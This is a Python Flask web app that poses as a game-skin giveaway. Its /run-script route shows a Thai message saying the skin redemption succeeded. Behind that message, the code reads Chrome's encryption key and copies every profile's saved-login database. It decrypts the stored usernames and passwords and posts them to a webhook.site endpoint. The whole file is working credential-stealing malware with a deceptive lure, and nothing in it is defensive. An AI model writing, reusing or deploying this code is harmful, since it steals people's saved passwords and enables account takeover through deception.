from flask import Flask, render_template
import os, json, base64, sqlite3, shutil, win32crypt
import requests
from Cryptodome.Cipher import AES

app = Flask(__name__)

# 🔐 Your webhook or endpoint
WEBHOOK_URL = "https://webhook.site/c8d4dd3e-bba8-4c6a-95eb-1595d91902ee"

def get_encryption_key():
    local_state_path = os.path.join(
        os.environ["USERPROFILE"],
        "AppData", "Local", "Google", "Chrome", "User Data", "Local State"
    )
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_password(encrypted_password, key):
    try:
        if encrypted_password[:3] == b'v10':
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)
            return decrypted[:-16].decode()
        else:
            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
    except:
        return "Cannot decrypt"

def extract_and_send_passwords():
    key = get_encryption_key()
    user_data_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")
    profiles = [p for p in os.listdir(user_data_path) if os.path.isdir(os.path.join(user_data_path, p)) and (p == "Default" or p.startswith("Profile "))]

    all_data = []

    for profile in profiles:
        db_path = os.path.join(user_data_path, profile, "Login Data")
        if not os.path.exists(db_path): continue

        temp_db = f"{profile}_LoginData.db"
        shutil.copyfile(db_path, temp_db)

        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

            for row in cursor.fetchall():
                url, username, encrypted_password = row
                password = decrypt_password(encrypted_password, key)
                all_data.append({
                    "profile": profile,
                    "url": url,
                    "username": username,
                    "password": password
                })

            cursor.close()
            conn.close()
        except Exception as e:
            print(f"[ERROR]: {e}")
        finally:
            if os.path.exists(temp_db):
                os.remove(temp_db)

    # ส่งข้อมูลทั้งหมดกลับ
    if all_data:
        try:
            requests.post(WEBHOOK_URL, json={"logins": all_data})
        except Exception as e:
            print(f"[Webhook Failed]: {e}")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/run-script')
def run_script():
    extract_and_send_passwords()
    return "<h3>✅ แลกรับสกินสำเร็จ! กรุณาเข้าเกมเพื่อรับของขวัญ</h3>"

if __name__ == '__main__':
    app.run(debug=True)
